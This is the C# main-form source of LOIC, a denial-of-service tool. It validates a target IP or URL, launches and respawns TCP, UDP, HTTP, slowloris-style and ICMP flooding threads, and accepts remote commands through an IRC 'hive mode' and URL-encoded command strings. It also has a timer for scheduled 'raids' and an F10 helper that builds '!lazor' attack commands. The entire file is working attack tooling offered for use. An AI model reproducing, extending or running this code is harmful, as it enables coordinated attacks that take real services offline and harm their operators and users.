/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace LOIC
{
	public partial class frmMain : Form
	{
		const string AttackText = "Initiate Testing";
		const string StpFldText = "Stop Test";

		private List<IFlooder> arr = new List<IFlooder>();
		private StringCollection aUpOLSites = new StringCollection();
		private StringCollection aDownOLSites = new StringCollection();
		private bool bIsHidden = false, bKonami = false, bResp, intShowStats;
		private string sMethod, sData, sSubsite, sTargetHost = "", sTargetIP = "";
		private int iPort, iThreads, iDelay, iTimeout, iSockspThread;
		private Protocol protocol;
		private delegate void CheckParamsDelegate(List<string> pars);

		/// <summary>
		/// Initializes a new instance of the <see cref="LOIC.frmMain"/> class.
		/// </summary>
		/// <param name="hive">Whether to enter hive mode.</param>
		/// <param name="hide">Whether to hide the form.</param>
		/// <param name="ircserver">The irc server.</param>
		/// <param name="ircport">The irc port.</param>
		/// <param name="ircchannel">The irc channel.</param>
		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
		{
			InitializeComponent();

			/* Lets try this! */
			bIsHidden = hide;
			if(hide)
			{
				this.WindowState = FormWindowState.Minimized;
				this.ShowInTaskbar = false;
			}
			else if(!Settings.HasAcceptedEula())
			{
				// Display EULA
				using(Form f = new frmEULA())
				{
					if(f.ShowDialog(this) != DialogResult.OK) {
						// Bail out if declined
						Environment.Exit(0);
						return;
					} else {
						// Save EULA acceptance
						Settings.SaveAcceptedEula();
					}
				}
			}
			bKonami = Konami.Check(this);
		}

		/// <summary>
		/// Attack the specified target
		/// </summary>
		/// <param name="toggle">Whether to toggle.</param>
		/// <param name="on">Whether the attack should start.</param>
		/// <param name="silent">Whether to silence error output.</param>
		private void Attack(bool toggle, bool on, bool silent = false)
		{
			if((cmdAttack.Text == AttackText && toggle) || (!toggle && on))
			{
				try
				{
					// Protect against race condition
					if(tShowStats.Enabled) tShowStats.Stop();

					if (!Functions.ParseInt(txtPort.Text, 0, 65535, out iPort)) {
						HandleError ("Invalid port.", silent);
						return;
					}
					if (!Functions.ParseInt(txtThreads.Text, 1, (bKonami ? 1337 : 99), out iThreads)) {
						HandleError ("Too many threads!  Lower than 100, please.", silent);
						return;
					}

					sTargetIP = txtTarget.Text;
					if (String.IsNullOrEmpty(sTargetIP) || String.IsNullOrEmpty(sTargetHost) || String.Equals(sTargetIP, "N O N E !"))
						throw new Exception("Select a target.");

					sMethod = cbMethod.Text;
					protocol = Protocol.None;
					try {
						protocol = (Protocol) Enum.Parse (typeof (Protocol), sMethod, true);
						// Analysis disable once EmptyGeneralCatchClause
					} catch { }
					if(protocol == Protocol.None) {
						HandleError ("Select a proper attack method.", silent);
						return;
					}

					sData = txtData.Text.Replace(@"\r", "\r").Replace(@"\n", "\n");
					if(String.IsNullOrEmpty(sData) && (protocol == Protocol.TCP || protocol == Protocol.UDP)) {
						HandleError ("No contents specified.", silent);
						return;
					}

					sSubsite = txtSubsite.Text;
					if (!sSubsite.StartsWith("/") && (int)protocol >= (int)Protocol.HTTP && (int)protocol != (int)Protocol.ICMP) {
						HandleError ("You have to enter a subsite (for example \"/\")", silent);
						return;
					}

					if (!int.TryParse(txtTimeout.Text, out iTimeout) || iTimeout < 1) {
						HandleError ("Invalid number in timeout box.", silent);
						return;
					}
					if (iTimeout > 999)
					{
						iTimeout = 30;
						txtTimeout.Text = "30";
					}

					bResp = chkWaitReply.Checked;

					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil || protocol == Protocol.ICMP)
					{
						if (!int.TryParse(txtSLSpT.Text, out iSockspThread) || iSockspThread < 1)
							throw new Exception("Please enter a number.");
					}
				}
				catch (Exception ex)
				{
					HandleError (ex.Message, silent);
					return;
				}

				cmdAttack.Text = StpFldText;
				//let's lock down the controls, that could actually change the creation of new sockets
				chkAllowGzip.Enabled = false;
				chkUseGet.Enabled = false;
				chkMsgRandom.Enabled = false;
				chkRandom.Enabled = false;
				cbMethod.Enabled = false;
				chkWaitReply.Enabled = false;
				txtSLSpT.Enabled = false;

				if (arr.Count > 0)
				{
					foreach (IFlooder i in arr)
					{
						i.Stop();
						i.IsFlooding = false;
					}
					arr.Clear();
				}

				for (int i = 0; i < iThreads; i++)
				{
					IFlooder ts = null;

					switch (protocol)
					{
						case Protocol.ReCoil:
							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
							break;
						case Protocol.slowLOIC:
							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
							break;
						case Protocol.HTTP:
							ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUseGet.Checked, chkAllowGzip.Checked);
							break;
						case Protocol.TCP:
						case Protocol.UDP:
							ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
							break;
						case Protocol.ICMP:
							ts = new ICMP(sTargetIP, iDelay, chkMsgRandom.Checked, iSockspThread);
							break;
					}

					if(ts != null)
					{
						ts.Start();
						arr.Add(ts);
					}
				}

				tShowStats.Start();
			}
			else if(toggle || !on)
			{
				cmdAttack.Text = AttackText;
				chkAllowGzip.Enabled = true;
				chkUseGet.Enabled = true;
				chkMsgRandom.Enabled = true;
				chkRandom.Enabled = true;
				cbMethod.Enabled = true;
				chkWaitReply.Enabled = true;
				txtSLSpT.Enabled = true;

				if (arr != null && arr.Count > 0)
				{
					foreach (IFlooder i in arr)
					{
						i.Stop();
						i.IsFlooding = false;
					}
				}
			}
		}

		/// <summary>
		/// Handles error messages.
		/// </summary>
		/// <param name="message">Message.</param>
		/// <param name="silent">If set to <c>true</c> silent.</param>
		private void HandleError(string message, bool silent = false)
		{
			if (silent) {
				return;
			}
			MessageBox.Show(message, "Nope.");
		}

		/// <summary>
		/// Lock on IP target.
		/// </summary>
		/// <param name="silent">Silent?</param>
		private void LockOnIP(bool silent = false)
		{
			try
			{
				string tIP = txtTargetIP.Text.Trim().ToLowerInvariant();
				if(tIP.Length == 0)
				{
					HandleError ("No IP address specified.", silent);
					return;
				}
				try
				{
					txtTarget.Text = sTargetHost = sTargetIP = IPAddress.Parse(tIP).ToString();
					if(sTargetHost.Contains(":"))
					{
						sTargetHost = "[" + sTargetHost.Trim('[', ']') + "]";
					}
				}
				catch(FormatException)
				{
					HandleError ("Invalid IP address.", silent);
					return;
				}
			}
			catch(Exception ex)
			{
				HandleError (ex.Message, silent);
				return;
			}
		}

		/// <summary>
		/// Lock on URL target.
		/// </summary>
		/// <param name="silent">Silent?</param>
		private void LockOnURL(bool silent = false)
		{
			try
			{
				string tURL = txtTargetURL.Text.Trim().ToLowerInvariant();
				if(tURL.Length == 0)
				{
					HandleError ("Please specify a URL.", silent);
					return;
				}
				if(!tURL.Contains("://"))
				{
					tURL = String.Concat("http://", tURL);
				}
				try
				{
					tURL = new Uri(tURL).Host;
					txtTarget.Text = sTargetIP = (Functions.RandomElement(Dns.GetHostEntry(tURL).AddressList) as IPAddress).ToString();
					txtTargetURL.Text = sTargetHost = tURL;
				}
				catch(UriFormatException)
				{
					HandleError ("That doesn't look like a URL.", silent);
					return;
				}
				catch(SocketException)
				{
					HandleError ("The URL you entered does not resolve to an IP!", silent);
					return;
				}
			}
			catch(Exception ex)
			{
				HandleError (ex.Message, silent);
				return;
			}
		}

		/// <summary>
		/// Checks the parameters.
		/// </summary>
		/// <param name="pars">Pars.</param>
		void CheckParams(List<string> pars)
		{
			Attack(false, false, true);

			foreach (string param in pars)
			{
				string[] sp = param.Split(new char[]{'='}, 2, StringSplitOptions.RemoveEmptyEntries);
				if (sp.Length == 2)
				{
					string cmd   = sp[0];
					string value = sp[1];

					int num;
					switch (cmd.ToLowerInvariant())
					{
						case "targetip":
							txtTargetIP.Text = value;
							LockOnIP(true);
							break;
						case "targethost":
							txtTargetURL.Text = value;
							LockOnURL(true);
							break;
						case "timeout":
							if(int.TryParse(value, out num) && num >= 1)
								txtTimeout.Text = num.ToString();
							break;
						case "subsite":
							txtSubsite.Text = Uri.UnescapeDataString(value);
							break;
						case "message":
							txtData.Text = Uri.UnescapeDataString(value);
							break;
						case "port":
							if (Functions.ParseInt(value, 0, 65535, out num))
								txtPort.Text = num.ToString();
							break;
						case "method":
							int index = cbMethod.FindString(value);
							if(index != -1)
								cbMethod.SelectedIndex = index;
							break;
						case "threads":
							if (Functions.ParseInt(value, 1, 99, out num))
								txtThreads.Text = num.ToString();
							break;
						case "wait":
							if (value.ToLowerInvariant() == "true")
								chkWaitReply.Checked = true;
							else if (value.ToLowerInvariant() == "false")
								chkWaitReply.Checked = false;
							break;
						case "random":
							if (value.ToLowerInvariant() == "true")
							{
								chkRandom.Checked = true; //HTTP
								chkMsgRandom.Checked = true; //TCP_UDP
							}
							else if (value.ToLowerInvariant() == "false")
							{
								chkRandom.Checked = false; //HTTP
								chkMsgRandom.Checked = false; //TCP_UDP
							}
							break;
						case "speed":
							if (Functions.ParseInt(value, tbSpeed.Minimum, tbSpeed.Maximum, out num))
								tbSpeed.Value = num;
							break;
						case "useget":
							if (value.ToLowerInvariant() == "true")
								chkUseGet.Checked = true;
							else if (value.ToLowerInvariant() == "false")
								chkUseGet.Checked = false;
							break;
						case "gzip":
						case "usegzip":
							if (value.ToLowerInvariant() == "true")
								chkAllowGzip.Checked = true;
							else if (value.ToLowerInvariant() == "false")
								chkAllowGzip.Checked = false;
							break;
						case "sockspthread":
							if (Functions.ParseInt(value, 1, 99, out num))
								txtSLSpT.Text = num.ToString();
							break;
					}
				}
				else
				{
					if (sp[0].ToLowerInvariant() == "start")
					{
						Attack(false, true, true);
						return;
					}
					else if (sp[0].ToLowerInvariant() == "default")
					{
						txtTargetIP.Text = "";
						txtTargetURL.Text ="";
						txtTimeout.Text = "30";
						txtSubsite.Text = "/";
						txtData.Text = "Invalid";
						txtPort.Text = "80";
						int index = cbMethod.FindString("TCP");
						if (index != -1) { cbMethod.SelectedIndex = index; }
						txtThreads.Text = "10";
						chkWaitReply.Checked = true;
						chkRandom.Checked = false;
						chkMsgRandom.Checked = false;
						tbSpeed.Value = 0;
						txtSLSpT.Text = "25";
						chkAllowGzip.Checked = false;
						chkUseGet.Checked = false;
					}
				}
			}
		}

		/// <summary>
		/// Handles the Form Load event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void frmMain_Load(object sender, EventArgs e)
		{
			string unlocked = bKonami ? " | *UNLEASHED*" : "";
			this.Text = String.Format("{0} | v.{1}{2}", Application.ProductName, Application.ProductVersion, unlocked);
		}

		/// <summary>
		/// Handles the Form Closed event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void frmMain_Closed(object sender, FormClosedEventArgs e)
		{
			Environment.Exit(0);
		}

        /// <summary>
        /// Handles the cmdTargetURL Click event.
        /// </summary>
        /// <param name="sender">Sender.</param>
        /// <param name="e">EventArgs.</param>
        private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			LockOnURL(false);
		}

		/// <summary>
		/// Handles the cmdTargetIP Click event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
			LockOnIP(false);
		}

		/// <summary>
		/// Handles the txtTarget Enter event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void txtTarget_Enter(object sender, EventArgs e)
		{
			cmdAttack.Focus();
		}

		/// <summary>
		/// Handles the cmdAttack Click event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void cmdAttack_Click(object sender, EventArgs e)
		{
			Attack(true, false, false);
		}

		/// <summary>
		/// Handles the tShowStats Tick event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void tShowStats_Tick(object sender, EventArgs e)
		{
			// Protect against null reference and race condition
			if(arr == null || intShowStats)
				return;

			intShowStats = true;

			int iIdle = 0;
			int iConnecting = 0, iRequesting = 0, iDownloading = 0;
			int iDownloaded = 0, iRequested = 0, iFailed = 0;

			bool isFlooding = false;
			if (cmdAttack.Text == StpFldText)
				isFlooding = true;

			if(arr.Count > 0)
			{
				for (int a = (arr.Count - 1); a >= 0; a--)
				{
					if(arr[a] != null && (arr[a] is cHLDos))
					{
						cHLDos c = arr[a] as cHLDos;

						iDownloaded += c.Downloaded;
						iRequested += c.Requested;
						iFailed += c.Failed;
						if(c.State == ReqState.Ready ||
							c.State == ReqState.Completed)
							iIdle++;
						if (c.State == ReqState.Connecting)
							iConnecting++;
						if (c.State == ReqState.Requesting)
							iRequesting++;
						if (c.State == ReqState.Downloading)
							iDownloading++;

						if (isFlooding && !c.IsFlooding)
						{
							cHLDos ts = null;

							int iaDownloaded = c.Downloaded;
							int iaRequested = c.Requested;
							int iaFailed = c.Failed;

							if (protocol == Protocol.ReCoil)
							{
								ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
							}
							if (protocol == Protocol.slowLOIC)
							{
								ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
							}
							if (protocol == Protocol.HTTP)
							{
								ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUseGet.Checked, chkAllowGzip.Checked);
							}
							if (protocol == Protocol.TCP || protocol == Protocol.UDP)
							{
								ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
							}
							if (protocol == Protocol.ICMP)
							{
								ts = new ICMP(sTargetIP, iDelay, chkMsgRandom.Checked, iSockspThread);
							}

							if(ts != null)
							{
								arr[a].Stop();
								arr[a].IsFlooding = false;

								arr.RemoveAt(a);

								ts.Downloaded = iaDownloaded;
								ts.Requested = iaRequested;
								ts.Failed = iaFailed;
								ts.Start();

								arr.Add(ts);
							}
						}
					}
				}
				if (isFlooding)
				{
					while (arr.Count < iThreads)
					{
						IFlooder ts = null;

						if (protocol == Protocol.ReCoil)
						{
							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
						}
						if (protocol == Protocol.slowLOIC)
						{
							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
						}
						if (protocol == Protocol.HTTP)
						{
							ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUseGet.Checked, chkAllowGzip.Checked);
						}
						if (protocol == Protocol.TCP || protocol == Protocol.UDP)
						{
							ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
						}
						if (protocol == Protocol.ICMP)
						{
							ts = new ICMP(sTargetIP, iDelay, chkMsgRandom.Checked, iSockspThread);
						}

						if(ts != null)
						{
							ts.Start();
							arr.Add(ts);
						}
						else break;
					}
					if (arr.Count > iThreads)
					{
						for (int a = (arr.Count - 1); a >= iThreads; a--)
						{
							arr[a].Stop();
							arr[a].IsFlooding = false;

							arr.RemoveAt(a);
						}
					}
				}
			}

			lbFailed.Text = iFailed.ToString();
			lbRequested.Text = iRequested.ToString();
			lbDownloaded.Text = iDownloaded.ToString();
			lbDownloading.Text = iDownloading.ToString();
			lbRequesting.Text = iRequesting.ToString();
			lbConnecting.Text = iConnecting.ToString();
			lbIdle.Text = iIdle.ToString();

			intShowStats = false;
		}

		/// <summary>
		/// Handles the tbSpeed ValueChanged event.
		/// </summary>
		/// <param name="sender">Sender.</param>
		/// <param name="e">EventArgs.</param>
		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (arr != null && arr.Count > 0)
			{
				foreach (IFlooder i in arr)
				{
					if(i != null) i.Delay = iDelay;
				}
			}
		}

		/// <summary>
		/// Decodes the commands and if necessary (re)starts the Attack.
		/// Works with the Captures from RegEx.
		/// </summary>
		/// <param name="cmds">the CaptureCollection containing a collection of commands</param>
		/// <param name="vals">the CaptureCollection containing a collection of values corresponding to the commands.</param>
		/// <returns>True if the commands were successfully loaded. False in case of any error.</returns>
		private bool parseOLUrlCmd(CaptureCollection cmds, CaptureCollection vals)
		{
			bool ret = false;
			if ((cmds.Count == vals.Count) && (cmds.Count > 0))
			{
				StringCollection defaults = new StringCollection();
				defaults.Add("targetip"); defaults.Add("targethost"); defaults.Add("timeout");
				defaults.Add("subsite"); defaults.Add("message"); defaults.Add("port");
				defaults.Add("method"); defaults.Add("threads"); defaults.Add("wait");
				defaults.Add("random"); defaults.Add("speed"); defaults.Add("sockspthread");
				defaults.Add("useget"); defaults.Add("usegzip");

				int num = 0;
				bool isnum = false;
				bool restart = false;
				bool ctdwndn = false;
				string tval = "";
				string tcmd = "";

				for (int i = 0; i < cmds.Count; i++)
				{
					tval = vals[i].Value.Trim();
					tcmd = cmds[i].Value.Trim();
					defaults.Remove(tcmd);
					switch (tcmd.ToLowerInvariant())
					{
						case "targetip":
							if (txtTargetIP.Text != tval)
							{
								txtTargetIP.Text = tval;
								LockOnIP(true);
								restart = true;
							}
							ret = true;
							break;
						case "targethost":
							if (txtTargetURL.Text != tval)
							{
								txtTargetURL.Text = tval;
								LockOnURL(true);
								restart = true;
							}
							ret = true;
							break;
						case "timeout":
							isnum = int.TryParse(tval, out num);
							if (isnum)
							{
								if (txtTimeout.Text != num.ToString())
								{
									txtTimeout.Text = num.ToString();
									restart = true;
								}
							}
							break;
						case "subsite":
							tval = Uri.UnescapeDataString(tval);
							if (txtSubsite.Text != tval)
							{
								txtSubsite.Text = tval;
								restart = true;
							}
							break;
						case "message":
							if (txtData.Text != tval)
							{
								txtData.Text = tval;
								restart = true;
							}
							break;
						case "port":
							if (txtPort.Text != tval)
							{
								txtPort.Text = tval;
								restart = true;
							}
							break;
						case "method":
							int index = cbMethod.FindString(tval);
							if (index != -1)
							{
								if (cbMethod.SelectedIndex != index)
								{
									cbMethod.SelectedIndex = index;
									restart = true;
								}
							}
							break;
						case "threads":
							if (Functions.ParseInt(tval, 1, 99, out num))
							{
								if (txtThreads.Text != num.ToString())
								{
									txtThreads.Text = num.ToString();
									if(cbMethod.SelectedIndex >= 3)
										restart = true;
								}
							}
							break;
						case "wait":
							if (tval.ToLowerInvariant() == "true")
							{
								if (!chkWaitReply.Checked)
									restart = true;
								chkWaitReply.Checked = true;
							}
							else if (tval.ToLowerInvariant() == "false")
							{
								if (chkWaitReply.Checked)
									restart = true;
								chkWaitReply.Checked = false;
							}
							break;
						case "random":
							if (tval.ToLowerInvariant() == "true")
							{
								if (!chkRandom.Checked || !chkMsgRandom.Checked)
									restart = true;
								chkRandom.Checked = true; //HTTP
								chkMsgRandom.Checked = true; //TCP_UDP
							}
							else if (tval.ToLowerInvariant() == "false")
							{
								if (chkRandom.Checked || chkMsgRandom.Checked)
									restart = true;
								chkRandom.Checked = false; //HTTP
								chkMsgRandom.Checked = false; //TCP_UDP
							}
							break;
						case "speed":
							if (Functions.ParseInt(tval, tbSpeed.Minimum, tbSpeed.Maximum, out num))
							{
								if (tbSpeed.Value != num)
								{
									tbSpeed.Value = num;
									restart = true;
								}
							}
							break;
						case "time": // might be not a bad idea to include a NTP-lookup before this?
							System.Globalization.CultureInfo ci = System.Globalization.CultureInfo.CurrentCulture;
							DateTime dtGo = DateTime.Parse(tval, ci.DateTimeFormat, System.Globalization.DateTimeStyles.AssumeUniversal);
							DateTime dtNow = DateTime.UtcNow;
							long tdiff = dtGo.Ticks - dtNow.Ticks;
							tdiff /= TimeSpan.TicksPerMillisecond;
							ret = true;
							tZergRush.Stop();
							if (tdiff > 0)
							{
								tZergRush.Interval = (int)tdiff;
								tZergRush.Start();
								this.Text = String.Format("{0} | U dun goofed | v. {1} | Next Raid: {2}", Application.ProductName, Application.ProductVersion, dtGo.ToString("MM-dd HH:mm"));
								restart = true;
							}
							else
							{
								ctdwndn = true;
								this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
							}
							ret = true;
							break;
						case "useget":
							if (tval.ToLowerInvariant() == "true")
								chkUseGet.Checked = true;
							else if (tval.ToLowerInvariant() == "false")
								chkUseGet.Checked = false;
							break;
						case "usegzip":
							if (tval.ToLowerInvariant() == "true")
								chkAllowGzip.Checked = true;
							else if (tval.ToLowerInvariant() == "false")
								chkAllowGzip.Checked = false;
							break;
						case "sockspthread":
							if (Functions.ParseInt(tval, 1, 99, out num))
								txtSLSpT.Text = num.ToString();
							break;
					}
				}
				// let's reset the other values -.-
				for (int i = 0; i < defaults.Count; i++)
				{
					switch (defaults[i])
					{
						case "targetip":
							txtTargetIP.Text = "";
							break;
						case "targethost":
							txtTargetURL.Text = "";
							break;
						case "timeout":
							txtTimeout.Text = "30";
							break;
						case "subsite":
							txtSubsite.Text = "/";
							break;
						case "message":
							txtData.Text = "U dun goofed";
							break;
						case "port":
							txtPort.Text = "80";
							break;
						case "method":
							int index = cbMethod.FindString("TCP");
							if (index != -1) { cbMethod.SelectedIndex = index; }
							break;
						case "threads":
							txtThreads.Text = "10";
							break;
						case "wait":
							chkWaitReply.Checked = true;
							break;
						case "random":
							chkRandom.Checked = false;
							chkMsgRandom.Checked = false;
							break;
						case "speed":
							tbSpeed.Value = 0;
							break;
						case "sockspthread":
							txtSLSpT.Text = "25";
							break;
						case "useget":
							chkUseGet.Checked = false;
							break;
						case "usegzip":
							chkAllowGzip.Checked = false;
							break;
					}
				}
				if (restart)
				{
					Attack(false, false, true);
					if(!tZergRush.Enabled)
						Attack(false, true, true);
				}
				else if (ctdwndn && (cmdAttack.Text == AttackText))
				{
					Attack(false, true, true);
				}
				if(!tZergRush.Enabled)
					this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
			}
			return ret;
		}

		/// <summary>
		/// Resolves and decodes the commands from the <paramref name="url"/> URL. (ONLY HTTP!)
		/// Calls <seealso cref="parseOLUrlCmd"/> for the actual decoding.
		/// </summary>
		/// <param name="url">URL-String. Either a shortened URL (from url-redirect-services) or the direct URL-encoded commands</param>
		/// <returns>True if the commands were successfully loaded. False in case of any error.</returns>
		private bool getOLUrlCmd(string url)
		{
			string rxpc = "([^@]?@([^=]+)=([^@]*)@)+";
			bool ret = false;
			MatchCollection matches = Regex.Matches(url, rxpc, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
			if (matches.Count == 0)
			{
				HttpWebRequest wreq = (HttpWebRequest)WebRequest.Create(url);
				wreq.AllowAutoRedirect = false;
				wreq.Method = WebRequestMethods.Http.Head;
				try
				{
					HttpWebResponse response = (HttpWebResponse)wreq.GetResponse();
					MatchCollection match = Regex.Matches(response.Headers.Get("Location"), rxpc, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
					response.Close();
					if (match.Count > 0)
					{
						ret = parseOLUrlCmd(match[0].Groups[2].Captures, match[0].Groups[3].Captures);
					}
				}
				catch
				{ } // most likely the url was either not an URI at all or it was not a redirect ... maybe consider it a backup?
			}
			else
				ret = parseOLUrlCmd(matches[0].Groups[2].Captures, matches[0].Groups[3].Captures);
			return ret;
		}

		private void frmMain_KeyDown(object sender, KeyEventArgs e)
		{
			switch (e.KeyCode)
			{
				case Keys.F10:
					string hivemind = "!lazor targetip=" + txtTargetIP.Text + " targethost=" + txtTargetURL.Text
						+ "default timeout=" + txtTimeout.Text + " subsite=" + Uri.EscapeDataString(txtSubsite.Text)
						+ " message=" + Uri.EscapeDataString(txtData.Text) + " port=" + txtPort.Text + " method=" + cbMethod.SelectedItem.ToString()
						+ " threads=" + txtThreads.Text + " wait=" + ((chkWaitReply.Checked) ? "true" : "false")
						+ " random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
						+ " speed=" + tbSpeed.Value.ToString() + " sockspthread=" + txtSLSpT.Text
						+ " useget=" + ((chkUseGet.Checked) ? "true" : "false") + " usegzip=" + ((chkAllowGzip.Checked) ? "true" : "false") + " start";

					string overlord = "http://hive.mind/go?@targetip=" + txtTargetIP.Text + "@&@targethost=" + txtTargetURL.Text
						+ "@&@timeout=" + txtTimeout.Text + "@&@subsite=" + txtSubsite.Text
						+ "@&@message=" + txtData.Text + "@&@port=" + txtPort.Text + "@&@method=" + cbMethod.SelectedItem.ToString()
						+ "@&@threads=" + txtThreads.Text + "@&@wait=" + ((chkWaitReply.Checked) ? "true" : "false")
						+ "@&@random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
						+ "@&@speed=" + tbSpeed.Value.ToString() + "@&@sockspthread=" + txtSLSpT.Text
						+ "@&@useget=" + ((chkUseGet.Checked) ? "true" : "false") + "@&@usegzip=" + ((chkAllowGzip.Checked) ? "true" : "false") + "@";

					new frmEZGrab(hivemind, overlord).Show();
					e.Handled = true;
					break;
				case Keys.F1:
					try { Process.Start("help.chm"); }
					catch { HandleError("Error 404 - Help Not Found", bIsHidden); }
					break;
			}
		}

		private void cbMethod_SelectedIndexChanged(object sender, EventArgs e)
		{
			chkMsgRandom.Enabled = (bool)(cbMethod.SelectedIndex <= 1 || cbMethod.SelectedIndex == 5); // TCP_UDP or ICMP
			txtData.Enabled      = (bool)(cbMethod.SelectedIndex <= 1); // TCP_UDP
			chkRandom.Enabled    = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
			txtSubsite.Enabled   = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic

			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3); // ReCoil_slowLoic_ICMP
			chkAllowGzip.Enabled = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
			chkWaitReply.Enabled = (bool)(cbMethod.SelectedIndex != 4 && cbMethod.SelectedIndex != 5); // TCP_UDP_HTTP_ReCoil
			chkUseGet.Enabled    = (bool)(cbMethod.SelectedIndex == 2 || cbMethod.SelectedIndex == 4); // HTTP_slowLoic
		}

		private void txtThreads_Leave(object sender, EventArgs e)
		{
			if (cmdAttack.Text == StpFldText)
			{
				int num = iThreads;
				if (int.TryParse(txtThreads.Text, out num) && num >= 1 && num <= 99)
				{
					iThreads = num;
				}
			}
		}
	}
}